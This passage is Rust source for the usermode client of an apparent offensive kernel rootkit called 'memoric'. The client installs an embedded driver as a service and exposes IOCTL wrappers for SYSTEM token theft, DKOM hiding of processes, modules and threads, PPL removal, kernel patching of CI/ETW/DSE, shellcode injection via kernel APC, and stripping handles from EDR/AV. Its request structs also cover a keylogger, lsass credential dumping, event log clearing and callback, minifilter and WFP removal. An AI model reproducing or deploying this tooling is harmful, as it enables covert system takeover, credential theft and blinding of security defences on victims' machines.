    pub eprocess_addr: u64,
}

// --- Process Protect ---
pub const PROTECT_SET: u32 = 0;
pub const PROTECT_STRIP: u32 = 1;
pub const PROTECT_QUERY: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct ProcessProtectRequest {
    action: u32,
    process_id: u32,
    signer_type: u8,
    signer_audit: u8,
    signer_level: u8,
    reserved: [u8; 5],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct ProcessProtectResponse {
    pub success: u32,
    pub process_id: u32,
    pub eprocess_addr: u64,
    pub old_protection: u8,
    pub new_protection: u8,
    pub old_signer_type: u8,
    pub old_signer_audit: u8,
    pub reserved: [u8; 4],
}

// === Phase 13 Structs ===

// --- Keylogger ---
pub const KEYLOG_START: u32 = 0;
pub const KEYLOG_STOP: u32 = 1;
pub const KEYLOG_READ: u32 = 2;
pub const KEYLOG_QUERY: u32 = 3;

#[repr(C)]
#[derive(Clone, Copy)]
struct KeyloggerRequest {
    action: u32,
    max_keys: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct KeyloggerResponse {
    pub success: u32,
    pub key_count: u32,
    pub active: u32,
    pub reserved: u32,
    pub keys: [u16; 512],
}

// --- Registry Hide ---
pub const REG_HIDE_ADD: u32 = 0;
pub const REG_HIDE_REMOVE: u32 = 1;
pub const REG_HIDE_LIST: u32 = 2;
pub const REG_HIDE_CLEAR: u32 = 3;

#[repr(C)]
#[derive(Clone, Copy)]
struct RegHideRequest {
    action: u32,
    hide_type: u32, // 0=key, 1=value
    key_path: [u16; 256],
    value_name: [u16; 128],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct RegHideResponse {
    pub success: u32,
    pub hidden_count: u32,
    pub total_hidden: u32,
    pub reserved: u32,
}

// --- File Lock ---
pub const FILE_LOCK_ADD: u32 = 0;
pub const FILE_LOCK_REMOVE: u32 = 1;
pub const FILE_LOCK_LIST: u32 = 2;
pub const FILE_LOCK_CLEAR: u32 = 3;

#[repr(C)]
#[derive(Clone, Copy)]
struct FileLockRequest {
    action: u32,
    protect_flags: u32, // bit0=anti-delete, bit1=anti-write, bit2=anti-read
    file_path: [u16; 260],
    allowed_pid: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct FileLockResponse {
    pub success: u32,
    pub locked_count: u32,
    pub total_locked: u32,
    pub reserved: u32,
}

// --- ETW Blind ---
pub const ETW_BLIND_DISABLE: u32 = 0;
pub const ETW_BLIND_ENABLE: u32 = 1;
pub const ETW_BLIND_QUERY: u32 = 2;
pub const ETW_BLIND_KILL_ALL: u32 = 3;

#[repr(C)]
#[derive(Clone, Copy)]
struct EtwBlindRequest {
    action: u32,
    reserved: u32,
    provider_guid: [u8; 16], // GUID in raw bytes
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct EtwBlindResponse {
    pub success: u32,
    pub providers_affected: u32,
    pub provider_addr: u64,
    pub old_enable_info: u64,
}

// --- EPROCESS Spoof ---
pub const SPOOF_IMAGE_NAME: u32 = 0;
pub const SPOOF_COMMAND_LINE: u32 = 1;
pub const SPOOF_QUERY: u32 = 2;
pub const SPOOF_PID: u32 = 3;

#[repr(C)]
#[derive(Clone, Copy)]
struct EprocessSpoofRequest {
    action: u32,
    process_id: u32,
    new_image_name: [u8; 16], // EPROCESS.ImageFileName is 15+1 bytes
    new_command_line: [u16; 260],
    new_parent_pid: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct EprocessSpoofResponse {
    pub success: u32,
    pub process_id: u32,
    pub eprocess_addr: u64,
    pub old_image_name: [u8; 16],
    pub old_parent_pid: u32,
    pub reserved: u32,
}

// --- Event Log Clear ---
pub const EVTLOG_CLEAR_ALL: u32 = 0;
pub const EVTLOG_CLEAR_SECURITY: u32 = 1;
pub const EVTLOG_CLEAR_SYSTEM: u32 = 2;
pub const EVTLOG_CLEAR_SYSMON: u32 = 3;
pub const EVTLOG_KILL_SERVICE: u32 = 4;

#[repr(C)]
#[derive(Clone, Copy)]
struct EventLogClearRequest {
    action: u32,
    reserved: u32,
    log_name: [u16; 64],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct EventLogClearResponse {
    pub success: u32,
    pub threads_killed: u32,
    pub files_deleted: u32,
    pub reserved: u32,
    pub svchost_pid: u64,
}

// --- Credential Dump ---
pub const CRED_READ_MEMORY: u32 = 0;
pub const CRED_FIND_LSASS: u32 = 1;
pub const CRED_DUMP_FULL: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct CredDumpRequest {
    action: u32,
    process_id: u32, // target PID (usually lsass)
    address: u64,    // address to read from
    size: u32,       // bytes to read
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct CredDumpResponse {
    pub success: u32,
    pub process_id: u32,
    pub eprocess_addr: u64,
    pub bytes_read: u32,
    pub reserved: u32,
    // data follows in buffer
}

// --- Driver Impersonate ---
pub const IMPERSONATE_SWAP: u32 = 0;
pub const IMPERSONATE_RESTORE: u32 = 1;
pub const IMPERSONATE_QUERY: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct DriverImpersonateRequest {
    action: u32,
    reserved: u32,
    target_path: [u16; 260],
    legit_path: [u16; 260],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct DriverImpersonateResponse {
    pub success: u32,
    pub reserved: u32,
    pub bytes_written: u64,
    pub nt_status: u64,
}

// --- Phase 14: Callback Nuke ---
pub const CBNUKE_ENUM: u32 = 0;
pub const CBNUKE_REMOVE: u32 = 1;
pub const CBNUKE_NUKE_ALL: u32 = 2;
pub const CBNUKE_RESTORE: u32 = 3;

pub const CB_TYPE_PROCESS: u32 = 0;
pub const CB_TYPE_THREAD: u32 = 1;
pub const CB_TYPE_IMAGE: u32 = 2;
pub const CB_TYPE_OBJECT: u32 = 3;
pub const CB_TYPE_REGISTRY: u32 = 4;

#[repr(C)]
#[derive(Clone, Copy)]
struct CallbackNukeRequest {
    action: u32,
    callback_type: u32,
    index: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct CallbackNukeEntry {
    pub address: u64,
    pub module_base: u64,
    pub module_name: [u8; 64],
    pub cb_type: u32,
    pub active: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct CallbackNukeResponse {
    pub success: u32,
    pub total_callbacks: u32,
    pub removed_count: u32,
    pub reserved: u32,
    pub entries: [CallbackNukeEntry; 64],
}

// --- Phase 14: Minifilter Detach ---
pub const MINIFILTER_DETACH_ENUM: u32 = 0;
pub const MINIFILTER_DETACH_ONE: u32 = 1;
pub const MINIFILTER_DETACH_NUKE: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct MinifilterRequest {
    action: u32,
    reserved: u32,
    filter_name: [u16; 64],
    frame_id: u32,
    reserved2: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct MinifilterDetachEntry {
    pub filter_name: [u16; 64],
    pub frame_id: u32,
    pub num_instances: u32,
    pub filter_addr: u64,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct MinifilterDetachResponse {
    pub success: u32,
    pub total_filters: u32,
    pub detached_count: u32,
    pub reserved: u32,
    pub entries: [MinifilterDetachEntry; 32],
}

// --- Phase 14: Kernel APC Inject ---
pub const KAPC_INJECT: u32 = 0;
pub const KAPC_DLL: u32 = 1;

#[repr(C)]
#[derive(Clone, Copy)]
struct KernelApcRequest {
    action: u32,
    process_id: u32,
    thread_id: u32,
    shellcode_size: u32,
    shellcode_addr: u64,
    dll_path: [u16; 260],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct KernelApcResponse {
    pub success: u32,
    pub thread_id: u32,
    pub apc_addr: u64,
    pub nt_status: u64,
}

// --- Phase 14: WFP Remove ---
pub const WFP_ENUM: u32 = 0;
pub const WFP_REMOVE_ONE: u32 = 1;
pub const WFP_NUKE: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct WfpRequest {
    action: u32,
    reserved: u32,
    callout_id: u64,
    provider_name: [u16; 64],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct WfpEntry {
    pub callout_id: u64,
    pub function_addr: u64,
    pub provider_name: [u16; 64],
    pub layer_id: u32,
    pub active: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct WfpResponse {
    pub success: u32,
    pub total_callouts: u32,
    pub removed_count: u32,
    pub reserved: u32,
    pub entries: [WfpEntry; 32],
}

// ================================================================
// MemoricDriver - usermode client
// ================================================================

/// Client handle to the memoric kernel driver.
/// All methods send IOCTLs to \\.\Memoric.
pub struct MemoricDriver {
    handle: HANDLE,
}

// HANDLE is Send+Sync safe for kernel device handles
unsafe impl Send for MemoricDriver {}
unsafe impl Sync for MemoricDriver {}

impl MemoricDriver {
    fn extract_embedded_driver() -> Result<std::path::PathBuf, MemoricError> {
        let extract_dir = std::env::temp_dir().join("memoric");
        std::fs::create_dir_all(&extract_dir).map_err(|e| {
            MemoricError::WindowsApi(format!("Failed to create extract dir: {}", e))
        })?;

        let extract_path = extract_dir.join("memoric.sys");
        let should_write = match std::fs::metadata(&extract_path) {
            Ok(meta) => meta.len() != EMBEDDED_DRIVER_BYTES.len() as u64,
            Err(_) => true,
        };

        if should_write {
            std::fs::write(&extract_path, EMBEDDED_DRIVER_BYTES).map_err(|e| {
                MemoricError::WindowsApi(format!("Failed to extract embedded memoric.sys: {}", e))
            })?;
            tracing::info!(
                "[DRIVER] Extracted embedded memoric.sys to {}",
                extract_path.display()
            );
        }

        Ok(extract_path)
    }

    pub fn ensure() -> Result<Self, MemoricError> {
        if let Ok(driver) = Self::open() {
            return Ok(driver);
        }

        let extracted_driver = Self::extract_embedded_driver()?;
        let extracted_path = extracted_driver.to_string_lossy().to_string();

        match Self::load(&extracted_path) {
            Ok(driver) => Ok(driver),
            Err(first_err) => {
                tracing::warn!(
                    "[DRIVER] Initial memoric load failed: {}. Retrying after cleanup.",
                    first_err
                );
                let _ = Self::unload();
                Self::load(&extracted_path).map_err(|second_err| {
                    MemoricError::WindowsApi(format!(
                        "Failed to ensure memoric driver from embedded payload. first_error={}, retry_error={}",
                        first_err, second_err
                    ))
                })
            }
        }
    }

    /// Open the memoric driver device. Returns error if driver is not loaded.
    pub fn open() -> Result<Self, MemoricError> {
        let path: Vec<u16> = DEVICE_PATH
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let handle = unsafe {
            CreateFileW(
                PCWSTR(path.as_ptr()),
                FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
                FILE_SHARE_NONE,
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                None,
            )
            .map_err(|e| {
                MemoricError::WindowsApi(format!(
                    "Failed to open {}: {} (is memoric.sys loaded?)",
                    DEVICE_PATH, e
                ))
            })?
        };

        tracing::info!("[DRIVER] Opened memoric driver device");
        Ok(Self { handle })
    }

    /// Check if the memoric driver is available without holding a handle.
    pub fn is_available() -> bool {
        Self::open().is_ok()
    }

    /// Load the memoric driver from a .sys file path, then open the device.
    pub fn load(sys_path: &str) -> Result<Self, MemoricError> {
        let driver_dest = r"C:\Windows\System32\drivers\memoric.sys";

        // Copy driver to System32\drivers
        std::fs::copy(sys_path, driver_dest)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to copy driver: {}", e)))?;

        unsafe {
            let sc_manager = OpenSCManagerW(None, None, SC_MANAGER_CREATE_SERVICE)
                .map_err(|e| MemoricError::WindowsApi(format!("OpenSCManager: {}", e)))?;

            let svc_name: Vec<u16> = SERVICE_NAME
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            let bin_path: Vec<u16> = driver_dest
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            // Try to create service; if exists, open it
            let service = CreateServiceW(
                sc_manager,
                PCWSTR(svc_name.as_ptr()),
                PCWSTR(svc_name.as_ptr()),
                SERVICE_ALL_ACCESS,
                SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START,
                SERVICE_ERROR_NORMAL,
                PCWSTR(bin_path.as_ptr()),
                None,
                None,
                None,
                None,
                None,
            )
            .or_else(|_| OpenServiceW(sc_manager, PCWSTR(svc_name.as_ptr()), SERVICE_ALL_ACCESS))
            .map_err(|e| MemoricError::WindowsApi(format!("Create/Open service: {}", e)))?;

            // Start service
            let _ = StartServiceW(service, None);

            let _ = CloseHandle(HANDLE(service.0 as *mut _));
            let _ = CloseHandle(HANDLE(sc_manager.0 as *mut _));
        }

        // Wait briefly for device to appear
        std::thread::sleep(std::time::Duration::from_millis(500));

        Self::open()
    }

    /// Unload the memoric driver.
    pub fn unload() -> Result<(), MemoricError> {
        use windows::Win32::System::Services::{
            ControlService, SERVICE_CONTROL_STOP, SERVICE_STATUS,
        };

        unsafe {
            let sc_manager = OpenSCManagerW(None, None, SC_MANAGER_CREATE_SERVICE)
                .map_err(|e| MemoricError::WindowsApi(format!("OpenSCManager: {}", e)))?;

            let svc_name: Vec<u16> = SERVICE_NAME
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            let service = OpenServiceW(sc_manager, PCWSTR(svc_name.as_ptr()), SERVICE_ALL_ACCESS)
                .map_err(|e| MemoricError::WindowsApi(format!("OpenService: {}", e)))?;

            let mut status = SERVICE_STATUS::default();
            let _ = ControlService(service, SERVICE_CONTROL_STOP, &mut status);

            let _ = DeleteService(service);

            let _ = CloseHandle(HANDLE(service.0 as *mut _));
            let _ = CloseHandle(HANDLE(sc_manager.0 as *mut _));
        }

        tracing::info!("[DRIVER] memoric driver unloaded");
        Ok(())
    }

    // ================================================================
    // Internal IOCTL helper
    // ================================================================

    /// Maximum retry attempts for transient failures
    const MAX_RETRIES: u32 = 3;
    /// Retry delay in milliseconds
    const RETRY_DELAY_MS: u64 = 50;

    fn ioctl(&self, code: u32, input: &[u8], output_size: usize) -> Result<Vec<u8>, MemoricError> {
        let mut last_err = None;

        for attempt in 0..Self::MAX_RETRIES {
            let mut output = vec![0u8; output_size];
            let mut bytes_returned = 0u32;

            let result = unsafe {
                DeviceIoControl(
                    self.handle,
                    code,
                    Some(input.as_ptr() as *const _),
                    input.len() as u32,
                    if output_size > 0 {
                        Some(output.as_mut_ptr() as *mut _)
                    } else {
                        None
                    },
                    output_size as u32,
                    Some(&mut bytes_returned),
                    None,
                )
            };

            match result {
                Ok(()) => {
                    output.truncate(bytes_returned as usize);
                    // Validate response: if we expected output but got nothing, warn
                    if output_size > 0 && bytes_returned == 0 {
                        tracing::warn!(
                            "[DRIVER] IOCTL 0x{:08X} returned 0 bytes (expected up to {})",
                            code,
                            output_size
                        );
                    }
                    return Ok(output);
                }
                Err(e) => {
                    let code_val = e.code().0 as u32;
                    // STATUS_DEVICE_BUSY = 0x80000011, ERROR_BUSY = 170
                    let is_transient = code_val == 0x80000011 || code_val == 170;
                    if is_transient && attempt + 1 < Self::MAX_RETRIES {
                        tracing::warn!(
                            "[DRIVER] IOCTL 0x{:08X} busy (attempt {}/{}), retrying...",
                            code,
                            attempt + 1,
                            Self::MAX_RETRIES
                        );
                        std::thread::sleep(std::time::Duration::from_millis(
                            Self::RETRY_DELAY_MS * (attempt as u64 + 1),
                        ));
                        last_err = Some(e);
                        continue;
                    }
                    return Err(MemoricError::WindowsApi(format!(
                        "DeviceIoControl 0x{:08X} failed: {}",
                        code, e
                    )));
                }
            }
        }

        Err(MemoricError::WindowsApi(format!(
            "DeviceIoControl 0x{:08X} failed after {} retries: {}",
            code,
            Self::MAX_RETRIES,
            last_err.map(|e| e.to_string()).unwrap_or_default()
        )))
    }

    fn ioctl_no_output(&self, code: u32, input: &[u8]) -> Result<(), MemoricError> {
        let mut last_err = None;

        for attempt in 0..Self::MAX_RETRIES {
            let mut bytes_returned = 0u32;

            let result = unsafe {
                DeviceIoControl(
                    self.handle,
                    code,
                    Some(input.as_ptr() as *const _),
                    input.len() as u32,
                    None,
                    0,
                    Some(&mut bytes_returned),
                    None,
                )
            };

            match result {
                Ok(()) => return Ok(()),
                Err(e) => {
                    let code_val = e.code().0 as u32;
                    let is_transient = code_val == 0x80000011 || code_val == 170;
                    if is_transient && attempt + 1 < Self::MAX_RETRIES {
                        tracing::warn!(
                            "[DRIVER] IOCTL 0x{:08X} busy (attempt {}/{}), retrying...",
                            code,
                            attempt + 1,
                            Self::MAX_RETRIES
                        );
                        std::thread::sleep(std::time::Duration::from_millis(
                            Self::RETRY_DELAY_MS * (attempt as u64 + 1),
                        ));
                        last_err = Some(e);
                        continue;
                    }
                    return Err(MemoricError::WindowsApi(format!(
                        "DeviceIoControl 0x{:08X} failed: {}",
                        code, e
                    )));
                }
            }
        }

        Err(MemoricError::WindowsApi(format!(
            "DeviceIoControl 0x{:08X} failed after {} retries: {}",
            code,
            Self::MAX_RETRIES,
            last_err.map(|e| e.to_string()).unwrap_or_default()
        )))
    }

    // ================================================================
    // Physical Memory Operations
    // ================================================================

    /// Read physical memory at the specified address.
    pub fn read_physical(&self, addr: u64, size: usize) -> Result<Vec<u8>, MemoricError> {
        if size == 0 || size > MEMORIC_MAX_IO_SIZE {
            return Err(MemoricError::WindowsApi(format!(
                "Invalid size: {} (max {})",
                size, MEMORIC_MAX_IO_SIZE
            )));
        }

        let req = PhysRequest {
            physical_address: addr,
            size: size as u32,
            reserved: 0,
        };

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<PhysRequest>(),
            )
        };

        self.ioctl(IOCTL_MEMORIC_PHYS_READ, input, size)
    }

    /// Write data to physical memory.
    pub fn write_physical(&self, addr: u64, data: &[u8]) -> Result<usize, MemoricError> {
        if data.is_empty() || data.len() > MEMORIC_MAX_IO_SIZE {
            return Err(MemoricError::WindowsApi("Invalid data size".to_string()));
        }

        let header = PhysWriteRequest {
            physical_address: addr,
            size: data.len() as u32,
            reserved: 0,
        };

        let header_bytes = unsafe {
            std::slice::from_raw_parts(
                &header as *const _ as *const u8,
                std::mem::size_of::<PhysWriteRequest>(),
            )
        };

        // Build input: header + data
        let mut input = Vec::with_capacity(header_bytes.len() + data.len());
        input.extend_from_slice(header_bytes);
        input.extend_from_slice(data);

        self.ioctl_no_output(IOCTL_MEMORIC_PHYS_WRITE, &input)?;
        Ok(data.len())
    }

    // ================================================================
    // Virtual Memory Operations
    // ================================================================

    /// Read virtual memory from another process (or kernel if pid=0/4).
    pub fn read_virtual(&self, pid: u32, addr: u64, size: usize) -> Result<Vec<u8>, MemoricError> {
        if size == 0 || size > MEMORIC_MAX_IO_SIZE {
            return Err(MemoricError::WindowsApi("Invalid size".to_string()));
        }

        let req = VirtRequest {
            process_id: pid,
            size: size as u32,
            address: addr,
        };

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<VirtRequest>(),
            )
        };

        self.ioctl(IOCTL_MEMORIC_VIRT_READ, input, size)
    }

    /// Write data to another process's virtual memory (or kernel if pid=0/4).
    pub fn write_virtual(&self, pid: u32, addr: u64, data: &[u8]) -> Result<usize, MemoricError> {
        if data.is_empty() || data.len() > MEMORIC_MAX_IO_SIZE {
            return Err(MemoricError::WindowsApi("Invalid data size".to_string()));
        }

        let header = VirtWriteRequest {
            process_id: pid,
            size: data.len() as u32,
            address: addr,
        };

        let header_bytes = unsafe {
            std::slice::from_raw_parts(
                &header as *const _ as *const u8,
                std::mem::size_of::<VirtWriteRequest>(),
            )
        };

        let mut input = Vec::with_capacity(header_bytes.len() + data.len());
        input.extend_from_slice(header_bytes);
        input.extend_from_slice(data);

        self.ioctl_no_output(IOCTL_MEMORIC_VIRT_WRITE, &input)?;
        Ok(data.len())
    }

    // ================================================================
    // Process Information
    // ================================================================

    /// Get CR3 (DirectoryTableBase) for a process. pid=0 for current process.
    pub fn get_cr3(&self, pid: u32) -> Result<Cr3Response, MemoricError> {
        let req = Cr3Request {
            process_id: pid,
            reserved: 0,
        };

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<Cr3Request>(),
            )
        };

        let output = self.ioctl(
            IOCTL_MEMORIC_GET_CR3,
            input,
            std::mem::size_of::<Cr3Response>(),
        )?;

        if output.len() < std::mem::size_of::<Cr3Response>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete CR3 response".to_string(),
            ));
        }

        let resp = unsafe { *(output.as_ptr() as *const Cr3Response) };
        Ok(resp)
    }

    /// Get EPROCESS information including dynamic kernel offsets.
    pub fn get_eprocess(&self, pid: u32) -> Result<EprocessInfo, MemoricError> {
        let req = EprocessRequest {
            process_id: pid,
            reserved: 0,
        };

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<EprocessRequest>(),
            )
        };

        let output = self.ioctl(
            IOCTL_MEMORIC_GET_EPROCESS,
            input,
            std::mem::size_of::<EprocessInfo>(),
        )?;

        if output.len() < std::mem::size_of::<EprocessInfo>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete EPROCESS response".to_string(),
            ));
        }

        let resp = unsafe { *(output.as_ptr() as *const EprocessInfo) };
        Ok(resp)
    }

    // ================================================================
    // Offensive Operations
    // ================================================================

    /// Steal token from source process and apply to target.
    /// Typically source_pid=4 (SYSTEM).
    pub fn token_steal(&self, source_pid: u32, target_pid: u32) -> Result<(), MemoricError> {
        let req = TokenRequest {
            source_pid,
            target_pid,
        };

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<TokenRequest>(),
            )
        };

        self.ioctl_no_output(IOCTL_MEMORIC_TOKEN_STEAL, input)
    }

    /// Hide process via DKOM (unlink from ActiveProcessLinks).
    /// Hidden from Task Manager / EnumProcesses / NtQuerySystemInformation.
    pub fn dkom_hide(&self, pid: u32) -> Result<(), MemoricError> {
        let req = HideRequest {
            process_id: pid,
            reserved: 0,
        };

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<HideRequest>(),
            )
        };

        self.ioctl_no_output(IOCTL_MEMORIC_DKOM_HIDE, input)
    }

    /// Remove Protected Process Light (PPL) protection.
    /// Zeros the PS_PROTECTION field in EPROCESS.
    pub fn ppl_remove(&self, pid: u32) -> Result<(), MemoricError> {
        let req = PplRequest {
            process_id: pid,
            reserved: 0,
        };

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<PplRequest>(),
            )
        };

        self.ioctl_no_output(IOCTL_MEMORIC_PPL_REMOVE, input)
    }

    /// Force-write to kernel memory, bypassing page protection (CR0.WP clear).
    /// Use for patching read-only kernel code (CI.dll, ETW, etc).
    /// Max 4096 bytes per call. Target must be a kernel address (> 0xFFFF000000000000).
    pub fn write_kernel(&self, addr: u64, data: &[u8]) -> Result<(), MemoricError> {
        if data.is_empty() || data.len() > MEMORIC_MAX_FORCE_WRITE {
            return Err(MemoricError::WindowsApi(format!(
                "Force-write size must be 1-{} bytes",
                MEMORIC_MAX_FORCE_WRITE
            )));
        }

        let header = KernelWriteRequest {
            address: addr,
            size: data.len() as u32,
            reserved: 0,
        };

        let header_bytes = unsafe {
            std::slice::from_raw_parts(
                &header as *const _ as *const u8,
                std::mem::size_of::<KernelWriteRequest>(),
            )
        };

        let mut input = Vec::with_capacity(header_bytes.len() + data.len());
        input.extend_from_slice(header_bytes);
        input.extend_from_slice(data);

        self.ioctl_no_output(IOCTL_MEMORIC_WRITE_KERNEL, &input)
    }

    /// Translate virtual address to physical address.
    /// pid=0 for kernel/current context.
    pub fn va_to_pa(&self, pid: u32, va: u64) -> Result<u64, MemoricError> {
        let req = Va2PaRequest {
            process_id: pid,
            reserved: 0,
            virtual_address: va,
        };

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<Va2PaRequest>(),
            )
        };

        let output = self.ioctl(
            IOCTL_MEMORIC_VA_TO_PA,
            input,
            std::mem::size_of::<Va2PaResponse>(),
        )?;

        if output.len() < std::mem::size_of::<Va2PaResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete VA2PA response".to_string(),
            ));
        }

        let resp = unsafe { *(output.as_ptr() as *const Va2PaResponse) };
        Ok(resp.physical_address)
    }

    // ================================================================
    // New IOCTLs
    // ================================================================

    /// Enumerate all processes from kernel's ActiveProcessLinks.
    /// Returns ground truth invisible to usermode API hooks.
    pub fn enum_processes(&self, max_entries: u32) -> Result<Vec<ProcessEntry>, MemoricError> {
        let req = EnumProcessRequest {
            max_entries,
            reserved: 0,
        };

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<EnumProcessRequest>(),
            )
        };

        let output_size = max_entries as usize * std::mem::size_of::<ProcessEntry>();
        let output = self.ioctl(IOCTL_MEMORIC_ENUM_PROCESS, input, output_size)?;

        let entry_size = std::mem::size_of::<ProcessEntry>();
        let count = output.len() / entry_size;
        let mut entries = Vec::with_capacity(count);

        for i in 0..count {
            let entry = unsafe { *(output.as_ptr().add(i * entry_size) as *const ProcessEntry) };
            entries.push(entry);
        }

        Ok(entries)
    }

    /// Hide a driver module from PsLoadedModuleList.
    /// name: driver filename, e.g. "memoric.sys"
    pub fn module_hide(&self, name: &str) -> Result<(), MemoricError> {
        let mut req = ModuleHideRequest {
            driver_name: [0u16; 64],
        };

        // Convert UTF-8 to UTF-16
        for (i, ch) in name.encode_utf16().enumerate() {
            if i >= 63 {
                break;
            }
            req.driver_name[i] = ch;
        }

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<ModuleHideRequest>(),
            )
        };

        self.ioctl_no_output(IOCTL_MEMORIC_MODULE_HIDE, input)
    }

    /// Hide a thread from its process's thread list.
    pub fn thread_hide(&self, thread_id: u32, process_id: u32) -> Result<(), MemoricError> {
        let req = ThreadHideRequest {
            thread_id,
            process_id,
        };

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<ThreadHideRequest>(),
            )
        };

        self.ioctl_no_output(IOCTL_MEMORIC_THREAD_HIDE, input)
    }

    /// Enumerate kernel notification callbacks.
    /// callback_type: CALLBACK_TYPE_PROCESS/THREAD/IMAGE/REGISTRY/OBJECT
    pub fn callback_enum(
        &self,
        callback_type: u32,
        max_entries: u32,
    ) -> Result<Vec<CallbackEntry>, MemoricError> {
        let req = CallbackEnumRequest {
            callback_type,
            max_entries,
        };

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<CallbackEnumRequest>(),
            )
        };

        let output_size = max_entries as usize * std::mem::size_of::<CallbackEntry>();
        let output = self.ioctl(IOCTL_MEMORIC_CALLBACK_ENUM, input, output_size)?;

        let entry_size = std::mem::size_of::<CallbackEntry>();
        let count = output.len() / entry_size;
        let mut entries = Vec::with_capacity(count);

        for i in 0..count {
            let entry = unsafe { *(output.as_ptr().add(i * entry_size) as *const CallbackEntry) };
            entries.push(entry);
        }

        Ok(entries)
    }

    /// Remove a specific kernel callback by type and index.
    /// callback_address: 0 to skip address verification.
    pub fn callback_remove(
        &self,
        callback_type: u32,
        index: u32,
        callback_address: u64,
    ) -> Result<(), MemoricError> {
        let req = CallbackRemoveRequest {
            callback_type,
            index,
            callback_address,
        };

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<CallbackRemoveRequest>(),
            )
        };

        self.ioctl_no_output(IOCTL_MEMORIC_CALLBACK_REMOVE, input)
    }

    /// Patch kernel subsystem (ETW-TI, DSE).
    /// enable=false: apply patch (disable protection), enable=true: restore original.
    pub fn patch_kernel(&self, patch_type: u32, enable: bool) -> Result<(), MemoricError> {
        let req = PatchKernelRequest {
            patch_type,
            enable: if enable { 1 } else { 0 },
        };

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<PatchKernelRequest>(),
            )
        };

        self.ioctl_no_output(IOCTL_MEMORIC_PATCH_KERNEL, input)
    }

    /// Queue a kernel APC to execute shellcode in the target process.
    /// The shellcode must already be mapped at shellcode_address in the target.
    /// thread_id=0 to auto-select the first thread.
    pub fn apc_inject(
        &self,
        pid: u32,
        tid: u32,
        shellcode_addr: u64,
        shellcode_size: u32,
    ) -> Result<(), MemoricError> {
        let req = ApcInjectRequest {
            process_id: pid,
            thread_id: tid,
            shellcode_address: shellcode_addr,
            shellcode_size,
            reserved: 0,
        };

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<ApcInjectRequest>(),
            )
        };

        self.ioctl_no_output(IOCTL_MEMORIC_APC_INJECT, input)
    }

    /// Strip (close) handles to the target process from all other processes.
    /// This prevents EDR/AV from querying or manipulating the target.
    pub fn handle_strip(
        &self,
        target_pid: u32,
        strip_type: u32,
        access_mask: u32,
    ) -> Result<HandleStripResponse, MemoricError> {
        let req = HandleStripRequest {
            target_pid,
            strip_type,
            access_mask,
            reserved: 0,
        };

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<HandleStripRequest>(),
            )
        };

        let output = self.ioctl(
            IOCTL_MEMORIC_HANDLE_STRIP,
            input,
            std::mem::size_of::<HandleStripResponse>(),
        )?;

        if output.len() < std::mem::size_of::<HandleStripResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete HandleStrip response".to_string(),
            ));
        }

        let resp = unsafe { *(output.as_ptr() as *const HandleStripResponse) };
        Ok(resp)
    }

    // ================================================================
    // Registry Protection (CmRegisterCallbackEx)
    // ================================================================

